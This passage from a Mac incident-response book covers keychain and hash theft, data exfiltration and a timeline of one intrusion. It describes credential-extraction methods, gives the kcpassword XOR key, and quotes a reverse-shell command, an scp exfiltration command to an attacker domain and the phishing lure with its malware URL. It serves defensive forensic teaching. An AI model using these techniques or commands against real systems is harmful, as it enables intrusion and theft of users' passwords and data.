
Passwords
185
passwords they don’t want to remember inside the keychain. For example, let’s 
say I use Microsoft Outlook on my Mac to manage emails. Every time I want to 
sync my inbox, Outlook opens a popup window and asks me to enter my user 
name and password (Fig. 8.4).
As you can see I’m presented with the option to “Remember this password 
in my keychain”. The keychain that this prompt is referring to is the stan-
dard keychain for my user located at ∼/Library/Keychains/login.keychain. If 
I choose not to save this password I will have to type it in every time I want to 
sync my inbox or send a message outbound. Since this is not super convenient, 
most users will choose to store the password inside their keychain.
“Keychain Access” is the main GUI tool built into OS X which allows for view-
ing and modifying the keychain and settings. However, in order to view pass-
words in plain text, you need to know the keychain password. By default the 
keychain is locked with the password you created for your user login. If you 
wish to change this, it can be done with the Keychain Access tool, but most us-
ers won’t bother. Therefore, if an attacker can gain a user’s login password, he 
then has a much better chance of accessing all of the data in the keychain. Also, 
by default the keychain will remain unlocked after a user logs in. Users have 
the option to lock the keychain after a specified amount of time has passed, 
but once again, many users don’t bother to change this setting.
OS X also comes with a built in command called “security” which can be ex-
ecuted from the terminal. Security gives you access to a specified keychain and 
many of its settings. This is a much more plausible target vector as an attacker 
is more likely to be logged in via a backdoor instead of through some type of 
remote desktop tool. Security has many built in functions. You can use the 
man page to learn all of them. Using our aforementioned Exchange scenario, 
an attacker could look for the Exchange password with the following syntax:
FIGURE 8.4

CHAPTER 8: 
Privilege Escalation & Passwords
186
Before this command executes successfully and returns the password in plain 
text, the user who is logged in to the GUI is presented with a pop up (Fig. 8.5).
This puts us back in a position where we are relying on the user’s common 
sense to keep them safe. In a perfect world, a user would click “Deny”, and 
call the IT department for help. Users less knowledgeable will click “Allow”, 
or worse “Always Allow”. Clicking “Always Allow” will place the requesting 
app (“security” in our case) on a special access control list that can access this 
specific password from now on without displaying this pop up warning. If the 
user clicks deny, an attacker will likely try the command every few seconds or 
minutes. The user may then get impatient and click allow. Allowing the afore-
mentioned prompt would display the following in the terminal:
FIGURE 8.5

Passwords
187
This output shows the user’s password in plain text printed at the bottom. Al-
ternatively, the -w switch can be used which will only print the user’s password 
without the rest of the information. An attacker could also pull a copy of this 
keychain to his local system and unlock it if he manages to acquire the user’s 
password. He would then have unlimited access to all the passwords unless the 
user opted to encrypt the keychain between use.
There are two other important keychain locations worth noting.
/Library/Keychains/System.keychain
This keychain stores confidential system passwords such as passwords to 
known wifi hotspots.
/System/Library/Keychains
A couple of different keychains are stored here mostly made up of root certifi-
cate information.
Dumping Login Hashes
Just like any other Operating System, OS X has to store user hashes on disk in 
order to verify an entered password upon login. This hash data is stored in the 
following file:
/var/db/dslocal/nodes/Default/users/$USER.plist
Where $USER.plist exists for each individual user on the system. Throughout 
the rest of this chapter we will refer to this plist as $USER.plist. Each of these 
files requires root permissions to access. They do not contain the user’s pass-
word hash in plain text. Rather, they contain pieces required to build the hash. 
This plist is in binary format. Make note that on 10.6 and earlier, password 
hashes were stored in
/var/db/shadow/hash/$USER.plist
We can view the contents of the $USER.plist file using defaults. If you run the 
following command, you will notice that there is quite a bit of data stored 
inside this file.
First off you’ll see that there is way too much data in here to fit on the screen. 
Part of that is thanks to the jpeg data used for your login picture. Let’s actually 
change this command to focus on the field that we care about most which is 
the ShadowHashData.

CHAPTER 8: 
Privilege Escalation & Passwords
188
When you run the aforementioned command you should see data presented in 
a similar fashion. Let’s use the sed command to extract the data inside of the “<” 
and “>”. We will then use xxd to convert this hexdump to binary. Which will re-
turn the data in a bplist format. Finally we will use plutil to convert it into a read-
able xml format.
We now have the data in a format that is much more usable to us. Let’s break 
down what the output consists of.

Passwords
189
j	 <key>SALTED-SHA512-PBKDF2</key>
j	 This is the type of hash we’re dealing with. A salted SHA512-PBKDF2 
hash. This hash type is no joke. Once we put this hash into a password 
cracking program it will take an incredibly long time to break.
j	 iterations
j	 The number of times the salt was iterated over
j	 salt
j	 The salt that is used to make the hash more difficult to crack
j	 Entropy
j	 The resulting PBKDF2 hash
Quick Hash Dump
Now that you understand how a password hash is built, note that instead of 
collecting this data by directly referencing the file, you can dump the hash data 
using the following dscl command:
Just adjust for the user whose hash you are aiming to collect. This command 
only collects the hash data itself. You will still have to pull the salt and other in-
formation to build the password hash. The Metasploit OS X hashdump ­module 
uses this command to collect the user hash and pulls the rest of the data from 
the $USER.plist.That being said, the dsAttrTypeNative:ShadowHashData is a 
great string to load into a Yara rule and scan for in memory.
Dave Grohl
Another popular tool for OS X password cracking has been built to auto-
mate the aforementioned process. This tool is called Dave Grohl. Dave Grohl 
was made open source and can be found at https://github.com/octomagon/
davegrohl. It takes a number of arguments and includes built in dictionary 
cracking abilities. Since this code was made open source it would be simple for 
an adversary to modify it making it easy to avoid static hash-based detections.

CHAPTER 8: 
Privilege Escalation & Passwords
190
As you can see Dave Grohl comes with a number of cracking options as well 
as the option to dump the hash in a format made for the infamous John the 
Ripper password cracking program. To dump a hash for a user named “test”, 
we would do the following:
The reason we’re looking at this password dumper is because it’s important for 
an analyst to know what steps the adversary might take if they’re determined 
to retrieve the password and all other methods have failed. Dumping the user’s 
hash is really a last resort. Again, keep in mind that just because the attacker 
has sudo privileges does not mean that they know the user’s password. It just 
means they’re likely to care less about what it might be. This process takes 
a dedicated attacker as cracking the salted PBKDF2 hash is incredibly slow. 
Here’s an example of using Dave Grohl with lowercase letters from the built in 
dictionary to try and crack the password.

Passwords
191
You’ll notice that even when using a dictionary (one of the faster ways to crack 
a hash if you’re lucky), I was only testing a little more than 1500 passwords 
per minute. The attacker would likely need access to a sophisticated supercom-
puter. This is why cracking the user hash is last resort.
Keychaindump
Rather than spending an incredible amount of time on a single password hash, 
the attacker has the ability to take another approach by trying to pull and de-
crypt passwords from process memory. Keychaindump was built to do just that. 
If an attacker has escalated to root then he will probably run this on the system 
so long as it predates OS X El Capitan (El Capitan no longer allows injec-
tion into system processes). Keychaindump was developed and released open 
source by Juuso Salonen. In a blog post from 2012 Juuso documents his find-
ings and explains that this is not a vulnerability or bug, but rather just a simple 
post exploitation technique. The attacker still needs to gain access to the system 
as well as escalate to root privileges in order to run keychaindump. This ap-
proach comes with its own conditions. As mentioned earlier, upon login your 
keychain is unlocked by default and remains unlocked while you use your sys-
tem. This is for convenience so that the user doesn’t need to enter their password  
every time an application wishes to access the keychain. If the user has changed 
this setting and chosen to lock the keychain after every use, keychaindump will 
no longer work; it relies on an unlocked keychain to function.
It’s important to understand how Keychaindump extracts passwords out of 
memory. The most important process in this transaction is the ”securityd“ pro-
cess. Apple refers to this process as a security context daemon for authoriza-
tion and cryptographic operations. The Apple developer libraries don’t say a 
whole lot about it; however, they do tell us that securityd handles access to the 
keychain.
In his research, Juuso refers to the key needed to decrypt the keychain as ”The 
Master Key“. A number of steps need to be taken to acquire this key as it is de-
rived from the user’s OS X login password. If you want to read the keychain file 
you must have this master key. The following steps can be done to acquire it.
Perform a scan of securityd’s heap (keychaindump does this with the vmmap 
command). Possible master keys are stored in an area flagged as MALLOC_
TINY. You can see the locations of these heaps yourself with the following 
command:

CHAPTER 8: 
Privilege Escalation & Passwords
192
Keychaindump will then search the returned heaps for occurrences of 
0x0000000000000018. If the following 8-byte value points to the current 
heap, we’ve found a potential master key. From here a bit of deobfuscation still 
needs to occur which can be seen in the source code, but as an analyst the most 
important part to note is that the necessary data to decrypt this information is 
stored in securityd’s process memory.
Here’s an example of keychain dump output.
/etc/kcpassword
The kcpassword file is a file that holds the user’s masked login password, but 
only if the system owner has enabled automatic login. That means that when 
the operating system starts the user will not be asked to enter their password. 
Instead the system will bring the user straight to the desktop. This option is 
not enabled by default for obvious reasons. It’s for the users who want to save 
time and disregard the fact that anyone could access their system. The pass-
word held inside the /etc/kcpassword is masked using XOR. For those who 
aren’t familiar with XOR masking, it’s basically a way of disguising characters 
as different characters. For instance, say my password is “hi” which in hexa-
decimal format is “68 69”. If I create an XOR key of “32, 59” it would work as 
follows:
hi = [68, 69]
key = [32, 59]
68 xor 32 = 5A
69 xor 59 = 30
So now my masked password would be “5A, 30”
I can easily reverse this process to get my password back.
5A xor 32 = 68
30 xor 59 = 69

Analysis
193
The XOR key that is used on the contents of the /etc/kcpassword file is 
as follows
0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F
If the user’s password is longer than the key (11 characters) then we start back 
at the beginning of the key again. All of this to say the /etc/kcpassword file can 
be decoded very easily using the following python code:
Remember that in order to access the /etc/kcpassword file you need to have 
root permissions. An attacker probably wouldn’t even bother with this file if 
they already gained the user password via social engineering. However, if they 
gained root via privilege escalation, this file could give the adversary instant 
access to the user’s password.
COLLECTION
A fair amount of our analysis will consist of searching memory and artifacts 
that we’ve already collected. There won’t be a whole lot of collection taking 
place in this chapter. There are a few commands we can run to gather addition-
al details on privileges and the keychain. Earlier in the chapter we discussed 
a find command that can find setuid and setgid binaries; however, we do not 
actually need this find command since we’ve already recorded which binaries 
are setuid and setgid when we collected the file listing.
We also want to know which users are sudo users, but have already collected 
the /private/etc/sudoers file in Chapter 4.
ANALYSIS
We’ll start our analysis simply by looking at which users are allowed to access 
root via the sudo command. This can be done by looking in the /private/etc/
sudoers file.

CHAPTER 8: 
Privilege Escalation & Passwords
194
This is a standard OS X sudoers file. It doesn’t look like it’s been tampered with 
in any way. It really only consists of comments and a few settings. The most 
important are the entries under “User privilege” specification comment.

Analysis
195
This tells us that anyone who belongs to the “admin” group is allowed to perform 
tasks using the sudo binary. Our next check is to see which users are in the admin 
group. We collected group info of each user during our bash calls in Chapter 3.
This snippet shows that mike, test, and root are all part of the admin group. 
When performing analysis on an OS X system, the odds are high that the system  
is a personal computer and you will only be dealing with the system owner 
who is also part of the admins group.
Our next step will be to see if there are any odd setuid binaries on the system. 
We can search the fileinfo.txt we built in Chapter 4 for this information. Inside 
this file we recorded setuid and setgid binaries.

CHAPTER 8: 
Privilege Escalation & Passwords
196
The majority of the files here appear to be standard OS X setuid binaries that 
come preinstalled. After you’ve learned to identify the ones that are normal, 
you’ll notice that there is one oddball that sticks out.
/usr/bin/mac_auth, 777, file, 0, 0, 8496, SETUID
We can instantly mark this file as suspicious for two different reasons. First, it 
follows a familiar naming scheme. We’ve seen the attacker malware drop many 
different items that run under an OS X type naming theme. Secondly, this file 
has permissions of 777. No standard OS X setuid binaries have read, write, and 
execute permissions set to every class. Finally, we see that this file belongs to 
UID 0 and GID 0 which are both root. We can further investigate this file by 
looking at the file timeline.
The earliest timestamp we see for mac_auth occurs 15 min after the installa-
tion of the malware (6:55). Given the time and details on this binary, it’s more 
likely that this was dropped by the attacker rather than exploited. This setuid 
binary could be a failsafe to regain root access if the attacker was to be discov-
ered. Let’s check to see mac_auth was active on the system.
At the time we ran our collection scripts mac_auth was not an active process. 
Can we find anything regarding this file in memory?
Here we see the file was dropped on the system in an unspecified location and 
then moved the /usr/bin/ directory. The setuid bit was then applied. We still 
don’t see any signs that it was executed, but we can’t be 100% sure. All of our 
artifacts have left us with little idea of what exactly this setuid binary does. This 
means our best bet is to return to the victim system and recover the file.

Analysis
197
Moving on, now that we’ve established which users are administrators, let’s 
check to see if any have enabled automatic login. You can do this either by 
looking for kcpassword inside our collected artifacts or by searching the filein-
fo.txt file again.
It looks like automatic login was not enabled because we see no kcpassword 
file on the system. This is good news for us since the attacker would have easily 
been able to recover the root password if this file existed.
Another question we have to ask ourselves is whether or not the attacker cop-
ied the keychain to a remote system. As discussed in this chapter, the attacker 
can take the user’s unlocked keychain (∼Library/Keychains/login.keychain) 
and access all the information inside of it if they can recover the user’s login 
password. Unfortunately, it will often be difficult to know whether or not the 
login.keychain file was accessed. Looking at the accessed timestamp won’t ben-
efit us because this file is accessed on a regular basis by legitimate tools. Our 
best bet is trying to find it in memory, but the analyst should almost always 
assume that this file will be collected by the adversary.

CHAPTER 8: 
Privilege Escalation & Passwords
198
The aforementioned output is just a short snippet of the number of hits you’ll 
find when looking for login.keychain in memory. Since this file gets accessed 
frequently by the keychain you can expect to run into it a lot. Look close and 
you’ll see the command “a∼upload /Users/Library/Keychains/login.keychain”. 
We can’t be entirely sure what this does but earlier we did discover that the 
attacker malware has a built in upload function. This is likely a sign that the 
attacker collected the keychain using it.
Let’s see if any other password attacks were successful on this system. Here is a 
Yara rule made up of a few strings you might find in memory from Dave Grohl, 
KeychainDump, and Metasploit.
Let’s use this rule to scan memory.

Analysis
199
This scan first returns a warning that the regex string we used to find a 48 char-
acter alphanumeric masterkey string is slowing down the Yara scan. It ends up 
paying off as we receive a positive hit on the keychaindump rule. Let’s look in 
memory to see what this hit is. We should be able to grep for any string that’s 
in the keychaindump rule.
Let’s expand this using grep -n.
We can see in memory that keychain dump did find a wrapping key, but 
based on the output that we’re seeing it did not seem to find any plain text 
passwords. This could be because none were cached in the securityd process 
at the time.
This analysis still leaves us wondering whether or not the attacker was able to 
recover plain text passwords, but we can see he was actively trying.
There is another question that we haven’t answered yet. How was the attack-
er able to gain root privileges in the first place? In the malware tree we have 

CHAPTER 8: 
Privilege Escalation & Passwords
200
created over the past few chapters we’ve seen a bash instance running as root 
that’s communicating with localhost on port 1583. Take a quick look at the ps 
aux output again.
It’s interesting that a backdoor would run a bash session using the sudo com-
mand. This would commonly imply that the attacker knows the user’s pass-
word. Let’s take a look for the “bash -i >& /dev/tcp/127.0.0.1/1583 0>&1” 
string in memory.
And once again, we will search the surrounding lines egrep -n.

Analysis
201
Here we see a snippet of python code that performs a sudo piggybacking at-
tempt. This code first runs “sudo -K” to delete the user’s sudo directory and 
then monitors /var/db/sudo for updates. When the folder is updated, the py-
thon code will use sudo to execute a remote bash session as root on the lo-
calhost over port 1583. It looks like this is how our attacker obtained root 
privileges (Fig. 8.6).
FIGURE 8.6

CHAPTER 8: 
Privilege Escalation & Passwords
202
CONCLUSION
Bottom line, if an attacker was able to escalate privileges from a standard user 
to a root user, we may not always be able to discover how he did so. Often 
times it may not even matter as attacker malware often tries to be installed with 
root permissions in the first place. It’s also important to be able to identify if 
any credential harvesting techniques were used while the attacker was on the 
system especially if the compromised user admits to using the same password 
for more than just their OS X login.
Yara rule of indicators discovered in this chapter.

203
OS X Incident Response﻿
Copyright © 2016 Elsevier Inc. All rights reserved.
Exfiltration
CHAPTER 9
INTRODUCTION
At last we’ve come to perhaps the most critical stage in the kill chain. Exfil-
tration or exfil is when an attacker finds data on a system that they see value 
in and choose to move it from the victim system to their own server. It’s the 
whole point of almost any intrusion. Hacktivists are looking for data to leak. 
Cyber criminals are looking for data to sell. APT actors are looking for data that 
will benefit their country, militaries, and more. The standard process usually 
involves locating data, archiving it, and transferring it to a server. This gives us 
three different substages we can potentially detect on during our analysis. The 
challenging part is that each of these stages can be carried out in many different 
ways and detecting them is key. Even though adversaries will often target file 
servers for exfil, they will occasionally look for valuable documents on an indi-
vidual’s system. Especially if that individual happens to be a person of interest 
such as the CEO or “big wig” of a company.
HOW VALUABLE DATA IS LOCATED
When it comes to searching for valuable data on OS X, attackers have a handful 
of readily available tools that are built into the operating system. These tools 
and exfil in general don’t require root privileges unless trying to access a loca-
tion where the compromised user does not have permissions. Assuming an 
attacker has gained access to a user’s local account, they will likely have access 
to that user’s documents.
Some attackers might not even care to go on a data hunt. After gaining system 
access they could just go straight to the “Documents” directory inside the user’s 
home folder and start transferring files that have interesting names. The attack-
er could also have a script written that scans the system for all document-like 
file extensions and creates an archive with the findings. This is a very popular 
technique and incredibly easy to do on OS X.

CHAPTER 9: 
Exfiltration
204
find
Find is a well-known tool readily available on almost any Unix platform. Al-
though it can be relatively slow it’s still a great way to find files you’re looking 
for. You can search for files based on filename, size, type, user, group, permis-
sions, timestamp, and more. You can even use the built-in execute functional-
ity to perform a command on each file that’s found.
The aforementioned command will search the entire hard drive for filenames 
that end with .docx. When it finds one, it will add that file to a directory 
called archive.tar. As you can see there is little need for third party tools on 
OS X.
mdfind
As we’ve seen in multiple chapters of this book, mdfind is a speedy tool that 
allows Spotlight functionality from the terminal. This means you can run an 
indexed search across the hard drive since OS X indexes files as they come in. 
As you create files spotlight is working in the background to store different 
metadata and keywords related to them. This feature is enabled by default and 
very few users will bother to turn it off as it serves a good purpose. Although 
this is an incredibly useful tool at the hands of the user, it can be disastrous 
when used at the hands of an attacker. Mdfind only requires one argument 
which is a keyword of your choosing.
A number of arguments are also built in to allow a more specific search. Some 
of the most notable switches are as follows:

How Data Is Archived
205
The aforementioned command reveals files in the documents directory that 
contain the word “confidential”. Xargs will then add each document to an ar-
chive called archive.tar. Unlike the find command, using mdfind will reveal 
files that contain keywords in the file contents as well as the file names. This is 
what makes it so dangerous if placed in the hands of an attacker. Although not 
as customizable as the find command, its quick speed and ability to search file 
contents makes it far more desirable.
HOW DATA IS ARCHIVED
When performing productive exfil, an attacker has to find a happy medium be-
tween time spent on the host and time spent on the network. The same applies 
to the analyst when collecting forensic artifacts. In Chapter 2 we had to decide 
how much compression to use after adding all of our artifacts to an archive. 
The attacker must do the same when collecting a large amount of exfil. Some 
attackers may prefer to use maximum compression so that less time is spent 
transferring data across the network. There are a number of archiving tools 
preinstalled on OS X to do this.
tar
Tar is a very popular tool on most Unix platforms as it’s quick and efficient. Tar 
itself does not handle compression archives. However the -z and -Z switches 
can be used where “-z” will compress using the gzip binary and -Z will com-
press using the compress binary.
zip
Creates archives in PKzip format. It has options to do both encryption and 
compression making it a tool likely to be used.
ditto
By now ditto is a command you should be quite familiar with as we have used 
it to collect many forensic artifacts. Ditto can create archives as well as com-
press them in both CPIO and PKzip format. It is able to decrypt archive files 
but it is not able to encrypt them.
Home Brewed
With all the scripting languages available an attacker may choose to throw 
together a quick python, perl, or ruby script to archive files. These will be 

CHAPTER 9: 
Exfiltration
206
harder to spot in memory analysis, but may be detectable by looking at the 
file system.
DETECTING ARCHIVED FILES BY TIMESTAMP
Let’s take a brief moment to see what changes are made to the file system when 
these archives are created. I’ll start by creating three empty files using bash.
Now let’s take a quick look at the timestamps of these files using python. This 
code is not meant to be part of any greater scripts. It is just for demonstration.
Running this code in the directory where we just created three new files gives 
us the following output:

Detecting Archived Files by Timestamp
207
Now let’s take these files we’ve created and add them to a new archive  
using zip.
Now when we run our python code we see the following results:
After running the zip command we see that all the timestamps remain the 
same with the exception of the accessed timestamp. This will hold true for a 
number of different archiving tools. Some may not modify timestamps at all. 
It just depends on how the tool is written.
We have used the find command a number of times using its built-in features 
to search for artifacts. We will once again refer to this command with a few 
arguments we haven’t used before.
This command will use regex to do a search for pdf, doc, docx, xls, xlsx, ppt, 
and pptx files below the user’s home directory. The -atime -5 tells find to only 
return files that have an accessed timestamp of the past 5 days. It then uses 
the “-exec ls -lu ) {} \;” which will show the details of the returned files using 
the accessed timestamp instead of the default modified timestamp. Finally, 
we use the sort command to sort the results by the accessed timestamp. If you 

CHAPTER 9: 
Exfiltration
208
prefer you could even do a search for all files that have been accessed rather 
than searching for specific file extensions, but note that you could end up over-
whelming yourself with a large amount of results. The idea behind using a 
command like this is that the results could contain a group of files that were 
accessed in the same time window. If those file names look like valuable data, 
we could then investigate further to see if we can discover potential exfil occur-
ring in that time window.
Since we have already collected an entire file listing, we can perform a search 
similar to this find command on data we’ve already captured. This will be cov-
ered in the analysis section.
COMPRESSION TOOLS
After archives are created they will be compressed for faster file transfer across 
networks. Here are a few popular built-in tools that are readily available.
gzip
A tool capable of taking a file and compressing it down to size. Attackers may 
consider running this on an archive they recently created.
compress
Another tool used to compress any file. This command may also be executed 
on archive files after they’ve been created. Compress can be used when creating 
a tar file by using the “-K” switch.
bzip2
Compresses files using the Burrows–Wheeler Algorithm. Less popular, but still 
built into the operating system and is known to be more efficient than gzip.
xz, lzma
A lesser known yet readily available tool “xz” can be run against a single file to 
create compressed archives using its own format. Alternatively, xz can be used 

How Attackers Transfer Data
209
to compress files in LZMA format using “xz --format = lzma” or use the “lzma” 
command which is an alias for the same thing. Many recognize this as a format 
used by the 7z archiver.
HOW ATTACKERS TRANSFER DATA
After the archive is zipped and compressed the adversary will transfer it to a 
server that they own. Moving data off Unix systems requires little work as there 
are many different ways to do it. Here are some of the methods that may be 
used for this purpose. Keep an eye out for these commands being used both in 
memory and in the “history” command output.
FTP/SFTP
File Transfer Protocol is one of the most common ways to get a file from point A 
to point B. Just like on Windows, ftp is built into OS X. It also has the built-in ca-
pabilities of secure ftp (sftp) which will encrypt the data during the file transfer.
SCP
Secure copy will work very similar to sftp. In fact, you can login to an ssh server 
using an sftp client if you really want to.
netcat
Also known as the “Swiss Army Knife” of TCP tools, netcat probably will not be 
used to transfer data to an adversary server; however it might be used to move 
data across a compromised network.
SMB
We will touch SMB more in the next section, but if an attacker is logged into 
the compromised Mac from another Windows system on the network, he may 
choose to copy files from the Mac to the Windows machine via SMB share.
E-Mail
“Mail” is a command line tool that is built in to OS X and capable of sending 
attachments if they are first encoded using uuencode. This will often times fail 
due to firewalls or incorrect communication to mail servers.
Backdoor
Many backdoors will have built-in functions to transfer data back to the at-
tacker.
Mounting Shares
Although some may argue that mounting shares fall under a different stage of 
the killchain, one of the main reasons for doing so is to steal data from them. 

CHAPTER 9: 
Exfiltration
210
Whether it be a share on a file server or a personal share, it’s at risk. A username 
and password are generally required for this step since it involves connecting 
to remote servers. A skilled adversary may already have a list of credentials at 
the ready depending on how they’ve gone about the intrusion process. OS X 
has no problem communicating with multiple different file share types. This 
allows attackers to move laterally on the network even across different operat-
ing systems. A common tool used to view network shares from one Windows 
system to another Windows system is “net view”. When viewing shares from 
an OS X system to a Windows system, the command used is “smbutil view”.
Many people are also familiar with mounting file shares on Windows using the 
“net use” command.
On OS X the command used to do this is called “mount”. Mount is capable 
of mounting drives of many different types. From the Terminal, the command 
will look similar to the following:
A folder must exist before you attempt to mount shared data to it. After suc-
cessfully mounting the SMB share, the secretData folder will be filled with the 
files from the Documents shared folder on CompanyFileServer. Alternatively, 
an IP address could be specified instead of a computer name.

How Attackers Transfer Data
211
In the aforementioned example, the mount_smbfs command could have been 
used instead. This command is just a wrapper for mount -t smbfs. Mount 
has a number of built-in wrappers at the ready, which you can see by typing 
“mount_” and pressing tab to autocomplete.
smbutil can also be used to view mounted file shares by using the “statshares 
-a” argument.
Finally, the secretData share can then be un-mounted with the “umount” com-
mand.

CHAPTER 9: 
Exfiltration
212
COLLECTION
There aren’t many additional steps we need to add to our collecting script 
when looking for exfil. Most of the artifacts we’ve already collected will be our 
best chance to reveal data theft such as memory strings and the file listing. We 
have also already accounted for the “smbutil statshares -a” command in our 
collection script during Chapter 3. Before moving to analysis though, let’s take 
a quick look at a proof of concept script that could catch potential exfil data if 
it still exists on the hard drive.
exfiltrator.py
Exfilled archives can be difficult to pinpoint but there are a few different ways 
to begin looking. This next script brings a basic yet effective idea to the table. 
Often times when creating an archive an adversary will name that archive 
something plain and boring. It’s a popular practice to use a false file extension 
to trick users who might stumble upon it. For instance, let’s say we’ve created 
an archive called “data.png” which contains all documents from the Docu-
ments directory.
The data.png file we just created is obviously not a png picture file, but as you 
can see there is nothing stopping us from applying any extension we want to 
an archive. This filename would not stick out to the untrained eye. What we 
need is a script that will look for an archive file that is not using an archive-like 
extension. We will write quick script that looks for files with the PKzip magic 
numbers “504b0304” but are not stored with a file extension commonly as-
sociated with PKzip. Note that a lot of different programs use PKzip-based files 
and we don’t want to see all of them. The whitelist array near the top in the 
code defines the file extensions that are legitimate if they are found with the 
specified magic numbers (Fig. 9.1).
FIGURE 9.1

Collection
213

CHAPTER 9: 
Exfiltration
214
This script will take a long time to run if you’re hitting every single file on the 
system. If you wanted to shorten its runtime you could just scan the /Users di-
rectory, but you may miss something important. Also, don’t panic if it yields a 
large number of results. This is not meant to find guaranteed exfil. It is simply a 
script designed to give you pointers worth investigating. You might be surprised 
at how many programs use PKzip-based files with random extensions. As you 
build a solid whitelist this tool will become more useful. The whitelist included 
in the code should be sufficient enough to limit your results to a good size. If 
you plan on running exfiltrator.py add it to the scripts folder inside our collec-
tion framework. We will look at the results of this script in the analysis section.
The only additions we need to make to our collection script are the following 
(Figs. 9.2 and 9.3):
FIGURE 9.2

Analysis
215
ANALYSIS
Analysis of Exfil will occur a great deal in memory and on the file listing. We 
can either manually look for key archiving words or we can set up scripts that 
go through and grep automatically. If you’re dealing with a system that is in-
cluded in a lot of development work, you could end up hitting a large amount 
of false positives when grepping memory for archiving strings.
Let’s start off our analysis of exfil by looking for popular document types on 
the system that were accessed.
FIGURE 9.3

CHAPTER 9: 
Exfiltration
216
Note that some languages like ruby and python may store documentation 
using a .doc file extension. You can remove these results by adding an ad-
ditional “| grep -v python” or “|grep -v ruby”. The aforementioned out-
put shows a number of important looking documents contain an accessed 
timestamp at 2015-12-11T07:05:50. Although this doesn’t guarantee foul 
play, we know this is right around the time of the intrusion we are han-
dling. Let’s take a look at the file timeline to see if any other activity took 
place at this time.

Analysis
217
This reveals an additional file of interest with a birth timestamp occurring 
1  s after the large number of documents being accessed. The file /tmp/.
DS_Store sticks out immediately. As explained in Chapter 4, .DS_Store is 
a hidden file created when a user browses to a directory using the “Finder” 
application. .DS_Store holds a number of settings regarding how it should 
format that folder to the user in Finder. Given that the tmp directory should 
never really be browsed to using Finder this is a red flag. The odds are good 
that this file is an archive and it was named .DS_Store in order to blend in 
with the operating system.
Let’s take a look at the output from our exfiltrator.py script to see if it flagged 
this file as having PKzip magic numbers.
It looks like this file is in fact a zip file, and based on the file timeline, we have 
a pretty good guess at what files it holds. Keep in mind that we wouldn’t have 
this evidence if the attacker deleted the archive when finished.
Let’s take a few steps backwards. While analyzing the system log in Chapter 4, 
we encountered a few suspicious entries regarding a file called “osx_patch” that 
looked as follows:
Around this same time we saw some generic application chatter on the file 
timeline that implied this could possibly be related to an SMB share.

CHAPTER 9: 
Exfiltration
218
Let’s take a quick look at the smbutil output we collected to see if any smb 
drives were mounted during our collection.
No luck there. It appears no SMB drives were documented at the time of our 
collection. What can we find regarding osx_patch inside of memory?
This returns a number of strings that pretty much tell the whole story. We can 
see toward the top the mount command is used with mike’s credentials to 
mount a file share called team_folder from a system called FileShare1. This 
means the contents of team_folder will now be mounted in the local directory 
osx_patch.
Down toward the bottom we see a tar command being used. “tar -cvf thumbs.
db osx_patch”
This tar command takes the contents of the file share and puts them into a new 
tar archive called thumbs.db. Let’s take a quick look to see if thumbs.db is in 
the file listing.

Analysis
219
How about memory?
This output finishes telling the story for us. After seeing the attacker create the 
thumbs.db archive from the Windows share, we see that it was compressed 
using “gzip thumbs.db”, uploaded using “scp thumbs.db anon@axrgcb.sys-
clouds.com:∼” (a domain we’re seeing for the first time), and also securely re-
moved using “srm thumbs.db.gz”. This explains why we no longer see thumbs.
db on the file listing. We likely would not have found this exfil if we hadn’t 
collected system memory. However, we can see that this system was recently 
talking the FileShare1 system inside the arp command output.
We have already discovered the exfil that occurred on this system, but if we 
didn’t know to look for thumbs.db.gz it might have been harder to locate. 
When dealing with a memory dump that you suspect holds commands used 
for exfil, it’s often wise to begin searching for the different file transfer tools in 
memory. Since a lot of these tools are only three to four letters long, they may 
return an overwhelming number of results. To lower the number of results 
you could use grep with the -w switch will essentially look for the keyword by 
itself (example “grep -w ping” matches “ping FileServer1” and does not match 
“xxxpingxxx”) (Fig. 9.4).

CHAPTER 9: 
Exfiltration
220
CONCLUSION
If you’re employed in the security industry, part of your job is to ultimately 
ensure that exfil does not occur. However, as any security analyst will tell you, 
sometimes the adversary will find a way in no matter how many defenses you 
put up. It’s important that when an attacker does make their way into our 
FIGURE 9.4

Conclusion
221
networks, we are able to respond accordingly and know what, if any, of our 
company information has been compromised. Exfil can occur in many differ-
ent ways and attackers are only getting better at it. As analysts, identifying exfil 
is critical as management teams will frequently ask two questions—“Did they 
get in?” and “What did they take?”.

223
OS X Incident Response﻿
Copyright © 2016 Elsevier Inc. All rights reserved.
The Timeline
CHAPTER 10
After analyzing an intrusion the last step is to ensure we have a documented 
timeline of the activity that took place. While investigating this intrusion we’ve 
managed to track the attackers actions, but in a very scattered manner. This 
timeline should tell the story of the entire intrusion across all systems in the 
environment. In our case, we’re dealing with one OS X system and a Windows 
system that was accessed from it. In a real world scenario we would perform 
analysis of the Windows system to see if any additional activity took place. This 
timeline isn’t just a report you can pass up to management, it’s also a record 
of a specific adversary’s tactics that you can look back on and compare with 
future intrusions.
Note: All of the items mentioned in this timeline have been shown throughout 
this book, but there are some additional timestamps shown here that we did 
not reveal throughout our analysis.
DECEMBER 2015 INTRUSION TIMELINE
j	 2015-12-11T06:54:57 Mike browses to his personal yahoo account and 
opens a phishing email
j	 2015-12-11T06:54:57, chrome_history,
–	 https://us-mg5.mail.yahoo.com/neo/launch?.rand=9pdsv3i4knp
uk#7481380534
j	 Relevant strings from memory
–	 Please download and install the attached application which will 
increase the security of company. Employees who don’t install 
this app will be in danger of getting viruses or other malware. 
This app will help protect company intellectal property and other 
data. Users who have not installed it by Monday will be penalized.
{*You can download the security update&nbsp; < a rel=“nofollow” 
class=“yiv1111835174edited-link-editor” target=“_blank” 
onclick=“return theMainWindow.showLinkWarning(this)”  

CHAPTER 10: 
The Timeline
224
href=“http://www.secupdat.com/security_update.zip”id=“yiv1111835 
174yui_3_16_0_1_1449553415532_6399”>here</a></div><div
j	 2015-12-11T06:55:31 security_update.zip written
j	 Description
–	 security_update.zip was the original malware delivered by the 
attacker via phishing attack. Within this zip file was a malicious 
application.
j	 2015-12-11T06:55:31, QUARANTINE,
–	 (u’com.google.Chrome’, u’Google Chrome’, u’http://www.
secupdat.com/security_update.zip’, None, None, 0, None, None, 
None)
j	 2015-12-11T06:55:31, chrome_download,
–	 http://www.secupdat.com/security_update.zip/security_update.
zip, /Users/mike/Downloads/security_update.zip, danger_
type:MAYBE_DANGEROUS_CONTENT, opened:1
j	 2015-12-11T06:55:49, security_update makes syslog entry
j	 2015-12-11T06:55:49, SYSLOG, security_update[2490]: done
j	 2015-12-11T06:55:49, SYSLOG, security_update[2490]: Checking for 
updates…
